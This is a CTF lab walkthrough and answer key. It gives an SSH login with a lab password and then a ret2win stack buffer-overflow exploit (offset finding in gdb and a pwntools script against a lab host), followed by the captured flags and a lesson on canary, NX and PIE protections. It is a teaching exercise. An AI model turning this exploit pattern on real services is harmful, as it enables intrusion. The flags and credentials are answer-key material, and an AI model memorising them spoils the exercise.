# Lab 8 — CTF Walkthrough (Answer Key)

## Flag 1: user.txt via SSH

```bash
ssh lowpriv@10.10.8.11
# password: lowpriv123
cat user.txt
```

Flag: `flag{lab8_ssh_initial_access}`

## Flag 2: ret2win exploit

```bash
# Find the offset
pwn cyclic 100 > /tmp/pattern.txt
gdb /root/tools/vuln
```

In gdb: `run` then paste the pattern. At the crash, `$rip` shows the `ret` instruction's own address (a real, valid address) — not a pattern value, because jumping to a non-canonical address faults *at* `ret`, not at the destination. Read the actual corrupted return address off the stack instead:

```
x/gx $rsp
```

`quit`, then:

```bash
pwn cyclic -l <the-value-from-x/gx-$rsp>
# reports offset 72 (64-byte buffer + 8-byte saved RBP)
```

```bash
python3 -c "from pwn import *; print(hex(ELF('/root/tools/vuln').symbols['win']))"
```

Fill in `exploit_template.py` with the offset (72) and run it:

```python
from pwn import *
exe = ELF('/root/tools/vuln')
io = remote('10.10.8.11', 9999)
payload = b'A' * 72 + p64(exe.symbols['win'])
io.send(payload)
io.interactive()
```

```bash
python3 /root/exploit.py
```

Output includes:

```
flag{lab8_ret2win_stack_overflow}
```

## Lesson

Every protection you checked with `checksec` (stack canary, NX, PIE) exists specifically to break one step of this chain: a canary would catch the overwrite before `ret` executes; NX would stop injected shellcode from running (though ret2win doesn't need that, since it jumps to *existing* code); PIE would randomize `win()`'s address every run. All three off is what makes this a fair "learn the technique" exercise rather than what you'd face against a hardened real target.
